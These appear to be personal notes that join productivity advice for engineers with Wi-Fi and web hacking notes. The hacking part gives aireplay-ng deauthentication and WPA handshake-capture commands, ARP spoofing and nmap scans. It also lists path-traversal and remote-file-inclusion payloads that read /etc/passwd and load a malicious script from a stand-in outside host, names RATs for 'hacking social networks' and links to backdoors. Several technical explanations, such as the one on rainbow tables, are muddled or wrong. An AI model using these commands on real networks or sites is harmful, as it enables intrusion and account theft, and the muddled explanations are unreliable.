** Github Effective engineer notes

   Focus on High Leverage Activities:

   Leverage = Impact Produced / Time Invested.
  
   80% of the impact comes from 20% of the work.

   And effective engineer is an engineer that produces results.

   Focus on High Leverage Activities:

   Leverage = Impact Produced / Time Invested.

   Use Leverage as Your Yardstick for Effectiveness.

   80% of the impact comes from 20% of the work.

   Focus on high leverage and not just easy wins.
   
   Optimize for Learning:

   Change jobs if you have to.

   Optimizing for learning is high leverage.

   Adopt a growth mindset.

   - Talk to people. Become good at telling stories. It gets better with time.

   - Those with a growth mindset believe that they can cultivate and grow their
     intelligente and skills through effort.

   -  Own your story

   Invest in the rate of learning.

   - Learning compounds. Compounding leads to exponential growth. Earlier the
     compounding starts, the better.

   - Working on unchallenging tasks is a huge opportunity cost. You missed out
     on compounded learning. 

   - Prioritize learning over profitability.

   - Invest your time in activities with the highest learning rate.

   Seek Work Environments Conducive to Learning

   - Fast Growth: Companies where #problems >> #resources. Opportunity to choose
     high impact work.

   - Make sure you are working on high priority projects.

   - Openness, look for culture with curiosity, where everyone is encouraged to
     ask questions.

   - Fast Paced.

   - People smarter than you.

   - Autonomy, Freedom to choose what to work on. Smaller companies => MOre
     autonomy.

   While on Job

   - Make a daily habit of acquiring new skills.

   - Read code written by brilliant engineers.

   - Jump fearlessly into code you don't know.

   - Always be learning. Invest in skills that are in high demand.

   - Read Books. Attend Conferences.

   - Build and maintain strong relationships.

   Prioritize Regularly:

   Opportunity cost of working on wrong ideas can set back growth by years.

   Prioritize task based on ROI (Return On Investment)

   Regular prioritization is high leverage activity.

   On TODO lists:

   Maintain a single todo lists where all task are listed.

   Don't try to remember stuff. Bain is bad at remembering. It's rather good at
   processing

   Ask yourself regularly: Is this the most important thing I should be working
   on?

   Focus on what directly produces value.

   Learn to say no.

   Focus on the important and non-urgent.

   Find ways to get into flow. "A state of effortless concentration so deep that
   they lose their sense of time, of themselves, of their problems."

   When possible, preserve large blocks of focused time in your schedule.

   Limit the amount of Work in Progress.

   Cost of context Switching is high.

   Prioritizing is difficult.

   Prioritization is high leverage. IT has huge impact on your ability to get
   right things done.

   Invet in Iteration Speed:

   Continuous Deployments is high leverage.

   Will save a lot of time in manual deployment of code. THey are the people who
   get things done. Effective Engineers produce results.

   Move fast to learn fast.

   Move fast and break things.
   
   Moing fast enables us to build more things and learn at faster rate.

   Invest in time saving tools.

   If you have to do something more than twice, write a tool the third time.

   Tools are multipliers that allow your to scale your impact beyond the
   confines of a day.

   Faster tools get used more often.

   Faster tools can enable new workflows that previously weren't possible.

   Productivity skyrockets with tools.

   Time saving property of tools also scale with team adoption.

   Shorten your debuggin and validation Loops.

   Extra time spent in optimizing debugging workflow can help you fix annoying
   bugs with less headache.

   Debudding is hard. It's time consuming. Upfront investments to shorten
   debugging loops are worth it.

   High test coverage to reduce buiild and site breakages.

   Fast unit tests to encourage people to run them.

   Fast and incremental compiles and reloads to reduce development time.

   Master your programming environment.

   One Editor, One high level language. Shell. Keyboard > Mouse. Automare manual
   workflows. Use interactive shell. Make running specific test easy.

   Faster you cna iterate, faster you can learn.

   Measure what you want to Improve.

   Use metric to drive progress.

   If you can't measure it, you can't improve it.

   Good Metric help you focus on right things, drives forward progress and helps
   you guard against future regressions.
   
   Performance ratcheting, any change should strictly improve the metric.

   Bad metric can lead to unwanted behavior.

   Examples:

   #hours worked < productivity

   click through rates < long click through rates.

   Metric you choose influences your decisions and behavior.

   Look for metric that, when optimized, maximizes impact for the team.

   Actionable metric - Those movement can be casually explained by team's
   effort.

   Responsive Metric - Updates quickly to give back feedback whether a given
   change was =ve or -ive.

   Choosing a metric iss high leverage.

   Dedicate time to pick right metric.

   Instrumate everything to unerstand what's going on.

   Measure anything, measure everything.
   
   Graphite, statsd. A single line of code lets you define a new counter or timer
   on the fly..
   
   Measuring goals you want to achieve is high leverage.

   Internalize useful numbers:

   Knowledge of useful numbers provide a valuable shortcut for knowing where to invest efforts to maximize gains.

   Need upfront work. Need not be accurate, ballpark idea suffices.

   Knowing useful numbers enables you to do back of the envelope calculations to
   quickly estimate the performance properties of a design without actually
   building it.

   Internalizing useful number help you spot anomalies. Be skeptical about data
   integrity.

   Log data liberally.

   Build tools to iterate on data accuracy sooner.

   Examine data sooner.

   When numbers look off, dig in to it sooner.

   Measure your progress. Carefully choose your top-level metric. Instrument
   your system. Know your numbers. Priorize data integrity.

   Validate your ideas early and often:

   Not validating early leads to wasted efforts.

   Don't delay get feedback.

   Find low effort ways to validate work.

** Aircrack-ng

   A complete suite of tools to audit a network's security.

   It focuses on different areas of WiFi security:
  
   - Monitoring :: Packet capture and export of data to text files for further
                   processing by third party tools.

   - Attacking :: Replay attacks, deauthentication, fake access points and
                  others via packet injection.

   - Testing :: Checking WiFi cards and driver capabilities (capture and
		injection)

   - Cracking :: WEP and WPA PSK (WPA 1 and 2).

   arpspoof -i (interface) -t (target) 192.168.1.42 192.168.1.1 -r (for a double attack)

   aircrack-ng, tool for changing a device of monitor mode

   airodump-ng, allows us to see traffic of our monitor mode device

   airdump-ng -c 11 --bssid 00:00:00:00:00:00 -w /root/no.nap wlan0mon

   Scans channel 11 and the bssid given and generates a file in /root/
   in a file
   
   airodump-ng is traffic capturing, not package capturing

   To web security: airdecap-ng

   Desencriptar con airdecap-ng

   airdecap-ng -l -e empresawisp -p caja5755apache trafico-01.cap

   After scanning traffic on a given aerea, we can make an:

   airodump-ng -c (channel)11 --bssid (MAC ADDRESS) -w (path for the file)

   After capturing the traffic, we can make an airdecap-ng (file created).cap,
   this decrypts the file

   Then, a (file)-dec.cap will be created, and that file can be accessed through
   wireshark.
   
   "Remove" internet:

   airmon-ng
   
   airmon-ng start wlan0
   
   airodump-ng wlan0mon
   
   airodump-ng -c 1 --bssid (MAC) -w (destiny) wlan0mon
   
   airodump-ng -c 9 --bssid otra red -w (file)
   
   airmon-ng check kill

  
   BSSID: The MAC address of the AP (Access Point). In the Client section, a
   BSSID of "(nor associated)" means that the client is not associated with any
   AP. In this unassociated state, it is searching for an AP to connect with.
   
   PWR: Signal level reported by the card. Its signification epends on the
   driver, but as the signal gets higher you get closer to the AP or the station.
   If the BSSID PWR is -1, then the driver doesn't support signal level
   reporting. If the PWER is -1 for a limited number of stations then this is for
   a packer which came from the AP to the client burthe client transmissions are
   out of range for your card. Meaning you are hearing only 1/2 of the
   communication. 
   
   RXQ: ONly shown when on a fixed channel. Receive Quality as measured by the
   percentage of packets (management and data frames) success-fully received over
   the last 10 seconds. It's mesasure over all management and data frames. THat's
   the clue, this allows you to read more things out of this value. Lets say you
   got 100 percent RXQ and all 10 (or whatever the rate) beacons per secon coming
   in. Now all of a sudden the TX drops below 90, but you still capture all sent
   beacons. Thus you know that the AP is sending frames to a client but you can't
   hear the client nor the AP sending to the client (need to get closer). Another
   thing would be, that you got a 11MB card to monitor and capture frames (say a
   prism2.5) and you have a very good position to the AP. THe AP is set to 54MBit
   and then again the RXQ drops, so you know that there is at least one 54MBit
   client connected to the AP.
   
   Beacons: Number of beacons sent by the AP. Each access point send about ten
   beacons per second at the lowest rate (1M), so they can usually be picked up
   from very far.
   
   When looking at the man page for airmon-ng, we get:
   
   airmon-ng - POSIC sh script designed to turn wireless cards into monitor mode. 
   
   This script can be used to enable monitor mode on wireless interfaces. It may
   also be used to go back from monitor mode to managed mode. Entering the
   airmon-ng command without parameters will show the interfaces status. It can
   also list/kill programs that can interfere with the wireless card operation.

     #Data: Number of captured data packets (if WEP, unique IV count), including
  data boardcast packets.

  #/s: Number of data packets per second mesaure over the last 10 seconds.

  CH: The channel that the AP is using.

  MB: Maximum speed supported by the AP. If MB = 11, it's 802.11b, if MB = 22
  it's 802.11b+ and higher rates are 802.11g. THe dot (after 54 above) indicated
  short preamble is supported. 'e' indicates that the network has QoS (802.11e)
  enables.

  ENC: Stands for encryption, the type of security that it has, normally to
  ever network it will be WPA2, which is widely used.

  OPN = no encryption, "WEP?" = WEP or higher (not enough data to choose between
  WEP and WPA/WPA2), WEP (without the question mark) indicates statis or dynamic
  WEP, and WPA or WPA2 if TKIP or CCMP or MGT is present.
  
  CIPHER: The cipher detected. One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104.
  Not mandatory, but TKIP is typically used with WPA and CCMP is typically used
  with WPA2. WEP40 is displayed when the key index is greater than 0. The
  standard states that the index can be 0-3 for 40bit and should be 0 for 104
  bit.

  AUTH: Stand for authentication, stands for the method of well, authentication,
  normally, it will be on 'PSK' (pre-shared key for WPA/WPA2) , which means that it needs a password in order
  to authenticate. MGT (WPA/WPA2 using a separate authentication server), SKA
  (shared key for WEP) or OPN (open for WEP).

  ESSID: THe name of the network.

  We'll normally see your target, and we can filter airodump-ng to give us all
  the information we want only about our target with '-d', which shows only
  networks matching the givven BSSID, for example:

  airodump-ng wlan0mon -d E4:BE:ED:D5:FB:D1  

  This will give us all the traffic happening, and some 'STATION' field, which
  is the MAC addressess of the ones that are connected to the network.

  When looking at the manuel of aircrack-ng it says:

  aircrack-ng - a 802.11 WEP / WPA-PSK key cracker

  There's an option for airdump-ng (-i) that only takes data useful for
  cracking, I'm not sure how to use it though.

  Capturing all the data iwthout the (-i) option, gives files that can be readed
  by wireshark.

  sudo aireplay-ng -0 0 -a E4:BE:ED:D5:FB:D1 -c F8:84:F2:1D:5E:20 -x 150
  wlan0mon

  This disconnect my phone of the network, I had before a message about the
  channel, for example: the AP is on channel 6 but wlan0mon is on 3, this was
  fixed with:

  sudo airmon-ng start wlan0mon 6
  
  -------------------------------------

  sudo airmon-ng

  sudo airmon-ng start wlan0 #wlan0 becomes wlan0 (is now on monitor mode)

  airodump-ng wlan0mon -w

  In the network 'beacons' = ethernet, cable. 

  In the network #Data = WiFi.

  aircrack-ng (file).cap

  Autenticación: network down

  aireplay-ng -0 3 -a (AP) -c (TARGET) -x 150 wlan0mon

  This will make a WPA handshake

  aircrack-ng (file).cap

  This will give us the password in the case the encryption is WEP

  The technique of WPA is:
  
  all .cap files have to be decrypted, so you should always:

  airdecap-ng (file).cap

  This will give us our same file but with dec name.

  Fluxion is a good tool for gathering information about a network.

  For WPA/WPA2 is the most use.

** Armitage

   A cyber attack management for metasploit.

** Metasploit

   A scriptable red team collaboration tool for Metasploit that
   visualizes targets, recommends exploits, and exposes the advanced
   post-exploitation features in the framework

** MITMF

   Framework for Man in the middle attack.

** sslstrip2-master
** Proxy like OWASP ZAP or Burpsuite Free
** Netscan
** Hacking Passwords
*** Threats

    Social Engineering, the best way to prevent against this form of
    attack would be avoiding the use of any information that may be
    common knowledge.

    Dumpster Diving and shoulder surdfind can provide useful
    information about someone that can be used to guess their password.

    Offline Password Cracking, If the attaciker has the password file
    then they have all the time in the world to run dictionaries and
    rainbow tables against it.

    Phishing, the cracker sends a link to a fake login page via email
    or chat. The victim clicks it, sees a familiar login page and
    enters their credentials.

    Password Sniffing means just waiting for you to type a password and
    grabbing off your system, network, or even right off your
    keyboard. hile keeping your computer clean of key capture dongles
    that fit between your keyboard and PC or malware that waits for
    password will help, it won-t do any good if the attacker is between
    you and the server you connect to. On web sites, enable HTTPS Only
    in youir browser to ensure that the site uses an encrypted
    connection whenever data is exchanged. Otherwise it-s too easy to
    grab your password straight from your connection to the server.

    Keyloggers, RATs and other malware can set up a keylogger or RAT
    server on the victim.
*** Hashed Passwords and Salts

    Storing passwords in plain text is bad, because of this, instead of
    keeping passwords lying around in plain text, let's encrypt them.

    The problems with encryption are the computing power required to
    encrypt and decrypt the password, and safely storing the encryption
    keys.

**** Hashes (MD5, SHA-1, SHA-2 and SHA-3)

     A hash is a mathematical formula that ses a password and sometimes
     random data (a salt) to return a single value. Think of a hash as
     a locksmith creating a key to fit one lock. The locksmith uses
     unique materials and spceial tools to make each key so that oly
     one key will ever fit that one lock. This hash key is built using
     the password as part of the material and some added information
     (the salt) to make the rest of the key. The hash key or hash
     string will only match one particular lock. If you try to create a
     duplicate key, the fake key won't match because only one key will
     ever fit that one lock.

     The random bits of data that are added to the hash algorithm, like
     a key for computations is called the salt.

     A salt is usually a string of random data from 48 to 128 bits
     long. The longer the salt, the higher the level of complexity and
     difficulty to crack.

    
**** Key Derivation Functions

     A step forward in hash functions are key derivation
     functions. These are ysed to derive keys from a string, a salt and
     a big number or iterations in a formula.

     DK (Derived Key) = KDF (Key, Salt, Iterations)

     The whole point is to make hash generation slow. But not too slow,
     "fast" hash algorithms let brute-force and dictionary attacks run
     wild; slow algorithms make them too slow to be pactical in many
     cases.

     Cryptology means altering information or data to make it
     incomprehensible and unreadable unless you possess some secret
     knowledge. One of the ways we do this is encryption.

     md5sum

*** Password Cracking
**** Use the brute force

     Brute-force attacks try every possible combination in the
     keyspace, or at least as many as it takes to find the
     password. They don't start with a list; they generate all the
     permutations on the fly. This means that brute-force attacks are
     very through on the one hand, but can take a very long time to run
     on the other. That's why experienced password crackers will try
     brute-forcing passwords of up to seven or eight characters in
     lower-case only, then switch to other attacks for longer and more
     complex passwords.

     Hashcat needs a hashdump file

     Dictionary Attacks uses a word list

     For dictionary attacks, use openwall, and John the Ripper

     How do you speed up dictionary attacks?, how about pre-hashing all
     those dictionary files?, the problem is that there are lots of
     different hashing algorithms our there. What you really need to do
     is hash each password with several different algorithms, and
     styore the results in a table with a column for each
     algorithm. These tables, with the plain and the hashes of
     different fixed lengths, these are Rainbow tables, and are an
     example of space/time tradeoff. In this case, the tradeoff is
     between huge use of disk space, to save huge amounts of time
     during actual cracking runs.

     Creating rainbow tables of entire word list is impractical
     precisely because of the issue of file size. So hashcrackers do
     something different. Cracking the hash by cracking small parts of
     it at a time, then assembling the parts. This is wildly clever and
     intensely mathematical.

     one logical attack is to look for repeated values in calculations:
     Using a hash (with salt) the word "Stun" could look like -dr23
     n9n2 8v84 llwi-. So, why not look for a pattern in other hash
     calculations to see if you can find a match?

     Rainbow tables do a nice trick, instead of looking for a whole
     password, rainbow tables let you look for fragments or pieces of
     passwords. Rainbow tables aren't exactly tables; they are a
     collection of columns in which each column uses a different
     reduction function. If you assigned each color you could think of
     the columns as a curve, or a rainbow. The whole idea is that if
     the calculated values of any two "colors" matches, you've found
     part of the password.

     From a mathematical perspective, try and wrap your mind around a
     simple formula of - v+x-4= 162

     Both v and x could be any combinations of numbers as long as the
     answer equals 162.

     The rainbow tablese already have hash values computed and any
     input you provide (to crack a password) is matched against each
     column (reducing values) until a perfect match is found. As we saw
     with "Stun" above, the hash calculation would look like this: dr23
     n9n2 8v84 2lwi. If you were to apply this into a rainbow table
     automated lookup generator, every two digits are analyzed and
     reduced to find a matching character. While this lookup is
     occurring, each column is reducing your input, thus speeding up
     the match finding process. Simple stuff, right?

     All the rainbow tables are doing is looking for the answer
     v+x-4= 162. The v and the x values are the unknown factors and the
     tables have already been calculated to find that type of answer,
     just on a massive scale.

     Since hash values are one-way, it is impossible to reverse
     engineer any hash string and expect to get a correct answer. Think
     of a hash calculation as a door that only opens in one direction
     and traffic can only flow in that same direction. It is highly
     likely that hash values will be the same somwhere along the way
     and that is how rainbow tables operate. Theycompare hash
     calculations that you provided against a massive collection of
     predetermined hash values. As the two digit set moves through the
     table, each column reduces the answer until a match is found.

     L0phtcrack is a powerful commercial password auditing tool.

     Combinator Attacks

     Rainbow tables have weakness: they're easily defeated when systems
     use a salt. When theu ser creates a password, the system also
     creates a random salt (a string of a few letters to add to the
     password), combines password and salt, and only then creates the
     hash. Every user's salt is unique to them. The salt can be stored
     unencrypted in the same table as the passwords hashes, it-s easier
     to stal both the hash and the salt, they're in the same table, so
     best practices seem to tell people to store the saltss in a
     separate table, or in a separate database, or on a separate
     machine.

     There are two commonly used methods to recover hash values in
     Windows. The first one is an injection using Local Security
     Authority Subsystem Service (LSASS) and the other is taking a
     direct reading off of the registry using SAM/System. LSASS reads
     the hash directly from memory, while SAM reads the local registry
     hives. There are other methods that can be used to gather hash
     values but LSASS and registry reads have a higher probability of
     success. Then the attacker can research and crack those hashes at
     his leisure off-line.  That's especially handy because the
     attacker can gather several (if not all) the hash strings in a
     single breach.

**** Network-based Password Cracking

     What about those times when you don't have a password hashdump,
     but need to recover the password to a database, web application or
     some other online service? This is wen you need a network password
     cracking tool.

     THC Hydra

     A speedy network authentication cracker which supports plenty of
     different services. When you need to brute force crack a remote
     authentication service, Hydra is ofthen the tool of choise. It can
     perform speedy dictionary assaults against more than 30 protocols,
     including telnet, ftp, http, https, smb, several databases and
     many more.

     Brutus

     Is a network brute-force authentication cracker. This Windows-only
     cracker tests network services on rmeote systems, trying to guess
     passwords by using a dictionary and permutations. It supports
     HTTP, POP3, FTP, SMB, TELNER, IMAP, NTP and more, it is not open
     source.

**** Wireless Password Cracking

     Aircrack, an open-source wireless security testing suite.

     It needs a wireless network interface controlled with a driver
     that supports raw monitoring mode (injection), and can sniff
     802.11a, 802.11b and 802.11g traffic.

     We'll need a average graphics card, known as a GPU for Graphic
     Processor Unit. These acrd are designed for repetitive task unlike
     a CPU, which is designed to all kinds of tasks. Even through your
     computer, smartphone, tablet and other devices have GPUs built
     into them, those chips are unlikely to be programmable by the
     user. They are locked chips that only accelerate the graphics for
     that device. The type of GPU needed to crack passwords (or mine
     bitcoins) are higher end gamer cards. A couple of these acards in
     a comoputer can crack passwords dozens of times faster but als
     ocosts more money.

     One of the best software programs out there for password recovery
     is oclHashcat, it's aimed at either AMD or nVidia/s graphics
     cards. Besides having control over almost every aspect of
     decrypting passwords. It also provides a watchdog to ensure you
     don't fry your GPU due to over temperature.

** Hacking Social Networks

   NoIP so your IP doesn't change, and the connection isn't
   interrupted because of IP changes, for example, restarting your
   modem

   Adwind R.A.T, Remote Administration Tool

   indetectables RAT, INDRAT

   Advanced File Joiner

   unicodeinput.exe

** Ethical Hacking, treeknow

   EvilFOCA
   FOCA PRO
   metadatos clean
   Certified Ethical Hacker (CEH) v8 and v7
   Ethical Hacking 2.0
   Web Hacking
   Backtrack 5 wireless penetration testing
   Curso de Hackeo Ricardo Nva
   Informatica Forense infortex
   alfaomega forense
   
   Malware are any malicious program, being it worms, spyware,
   troyans, virus or scripts that may damage a system.

   Exploit is made by showing any vulnerability in an app.

   Making Logic diagrams is great for any programmer, independent of
   the programming language

   Backdoors on-the-fly: www.hackerz.ir/e-books/init_rpi.txt

   Troyan Binaries: Replacing binaries of the system is a great way of
   hiding in plain sight
   
   Rootkits: Apps used to maintain root privileges on a server, making
   use of hidded processes.

   Sniffers: Capture logins of any packet on the network.

   in Linux/Unix or solaris, Shadows are used for these types of
   intrution, for Windows, SAM.

   Google Hack Honeypot

   Google Hacking for Penetration Testers, Volume 2, johnny Long

   http://johnny.ihackstuff.com/ghdb.php

   SmartWhoIs
   CountryWhois

*** Fase de Reconocimiento

    ROBTEX
    builtwith
    MALTEGO
    FOCA
    centralops.net
    proxylist.hidemyass.com
    geoipview.com
    robtex
    Netcraft
    THEHARVESTER

    in order to use the information, one has to know about the TCP/IP
    protocol. 

    For a normal TCP connection, it's necessary to follow a three step
    negociation. This negociation is started ith a SYN packet in the
    original machine, the other machine gives a SYN/ACK packet in
    response, which is finally responded with the original machine
    with a ACK packet.

    Once this is made, the connection is confirmed.

    A port scanner sends several SYN packets to the destination
    machine, and scans the response.

    If after sending a SYN packet on a specific port the destiny gives
    us a SYN/ACK, the port is open and listening to conections, if
    not, or if a ICMP Port Unreachable packet is received, the port is
    filtered by a firewall.

    | Port | Description                           |
    |------+---------------------------------------|
    |    1 | TCP Port Service Multiplexer TCPMUX   |
    |    5 | Remote Job Entry (RJE)                |
    |    7 | ECHO                                  |
    |   18 | Message Send Protocol (MSP)           |
    |   20 | FTP - Data                            |
    |   21 | FTP - Control                         |
    |   22 | SSH Remote Login Protocol             |
    |   23 | Telnet                                |
    |   25 | Simple Mail TRansfer Protocol (SMTP)  |
    |   29 | MSG ICP                               |
    |   37 | Time                                  |
    |   42 | Host Name Server (Nameserv)           |
    |   43 | WhoIs                                 |
    |   49 | Login Host Protocol (Login)           |
    |   53 | Domain Name System (DNS)              |
    |   69 | Trivial File Transfer Protocol (TFTP) |
    |   70 | Gopher Services                       |
    |   79 | Finger                                |
    |   80 | HTTP                                  |
    |  103 | X.400 Standard                        |
    |  108 | SNA Gateway Access Server             |
    |  109 | POP2 110 POP3                         |
    |  115 | Simple File Transfer Protocol (SFTP)  |
    |  119 | SQL Services                          |
    |  119 | Newsgroup (NNTP)                      |
    |  137 | NetBIOS Name Service                  |
    |  139 | NetBIOS Datagram Service              |
    |  143 | Interim Mail Access Protocol (IMAP)   |
    |  150 | NetBIOS Session Service               |
    |  156 | SQL Server                            |
    |  161 | SNMP                                  |
    |  179 | Border Gateway Protocol (BGP)         |
    |  190 | Gateway Access Control Protocol       |
    |  194 | Internet Relay Chat (IRC)             |
    |  197 | Directory Location Service (DLS)      |
    |  389 | Lightweight Directory Access Protocol |
    |  396 | Novell Netware over IP                |
    |  443 | HTTPS                                 |
    |  444 | Simple Network Paging Protocol        |
    |  445 | Microsoft-DS                          |
    |  458 | Apple QuickTime                       |
    |  546 | DHCP Client                           |
    |  547 | DHCP Server                           |
    |  563 | SNEWS                                 |
    |  569 | MSN 1080 Socks                        |

    Well known ports, to a full list of dinamic and private ports, go
    to wwww.iana.org/assignments/port-numbers

    www.eeye.com and wwww.appsecinc.com
    Nessus
    
    Nmap:

    Ports listing : nmap-sS IP
    Barrida de rango: nmap -sS 200.**.0.2-200 (Scans in a range, from
    2 to 200)
    Barrida de rango buscando los puertos SSH, Netbios, FTP y Telnet: 
    nmap -sS -p 22,21,139,23 200.**0.2-200
    Operating system: nmap -O -v IP
    Services versions: nmap -T Aggressive -sV -n -O -v IP

    UMIT, the nmap frontend

    Inyection:

    In PHP querys, one can inject special characters, even web links
    that execute scripts with commands, these querys are calls for
    files or variables that made some .php scripts in the server, for
    example: sitiovictima/file.php?id=34 (calling a variable),
    sitiovictima/file.php?file=encuesta.htm (calling for a
    file). Let's suppose that after the = character we put '' or URLS
    with scripts to execute commands in the server, or simply generate
    errors to see which information the target gives us.

    sitiovictima/file.php?file='
    sitiovictima/file.php?file=../../../../../etc/passwd
    sitiovictima/file.php?file=/etc/passwd00%
    sitiovictima/file.php?file=www.sitiodeporahi.com/scriptmaligno.php
    sitiovictima/file.php?file=www.sitiodeporahi.com/archivoasubir.gif
    sitiovictima/file.php?file=sitiovictima/file.php
    sitiovictima/file.php?file=file.php
    sitiovictima/file.php?file=anything to generate errors to achieve
    something on the app

    Jeffrey's Exif Viewer

    Any tool can't compare with the imagination of the human in any
    type of problem.

    A security check only basedo n tools, operating systems and
    exploits without a mind behind is not more than checking for
    normal problems. In the more common problems we can say:

    sitiovictima/robots.txt, sitiovictima/backup/ and
    sitiovictima/upload.asp
    
    telnet 

    SecureCTR (www.vandyke.com)

    AMAP

    Some examples of HTTP petitions are:

    Discover if the target is vulnerable to SQL injection putting a
    simple ' on a login or string in the URL.

    Searching of directories
    Hidden Subdomains , intranets, extranets
    CGIs known or not, XSS
    Paths with / at the end
    Administration web panels, ftp, mail or another institutional app
    or private of intern design.
    Apps to upload files
    Repositories of confidential files or not, hidden or not.
    Common files as robots.txt, that give a list of public paths and
    hidden in the server
    Code of the page
    If Remote scripts can be injected
    
    A good tool is CURL, a command line interface to transfer files
    with a sintax URL, support for FTP, FTPS, HTTP, HTTPS, SFTP, TFTP,
    LDAP, LDAPS. Curls supports SSL certificated, HTTP POST, HTTP PUT,
    FTP uploading, HTTP form based upload, proxies, cookies,
    user+password authentication, file transfer resume, proxy
    tunneling and others.

    Commands can be injected
    Cookies can be injected
    Is possible to make a file retrieve, extract/read operating system
    files.
    Directories can be traspassed
    Jumping accessing controls of data with a proxy
    URL parameters can be replaced to generate erros.
    Downloading of binary files or another type for analize
    A file manager can be found
    Another, as trying to add data via POST clicking the bottom accept
    and then Enter, see if there is a difference in the comprobation,
    or making a retrieve of any password or data.

    
    
** GRSecurity

   GRecurity is a set of patches for the linux kernel with and
   emphasis on enhancing security. Its typical application is in web
   servers and systems that accept remote connections from untrusted
   locations, such as systems offering shell access to its users.

   GRsecurity is free software.

*** PaX

    A major component bundled with grsecurity is PaX, which is a patch
    that ,amogst other things, flags data memory, such as that on the
    stack, as non-executable, and program memory as non0writable. The
    aim is to prevent executable memory pages from being overwritten
    with injected machine code, which prevents exploitation of many
    types of security vulnerabilities, such as buffer overflows. PaX
    also provides address space layout randomization addressess being
    easily known. PaX is not itself developed by the grsecurity
    developers.

    GRsecurity provides a full Role0based access control (RBAC)
    system. RBAC is intented to restric access to the system further
    than what is normally provided by Unix access control lists, with
    the aim of creating a fully least-privilege system, where users
    and processess have the absolute minimun privilegese to work
    correctly and nothing more. This way, if the system is
    compromised, the ability by the attacker to damage or gain
    snesitive information on the system can be drastically
    reduced. RBAC works through a collection of "roles". Each role can
    have individual restrictionxs on what they can or cannot do, and
    these rolees and restrictions form a "policy" which can be amended
    as needed.

    
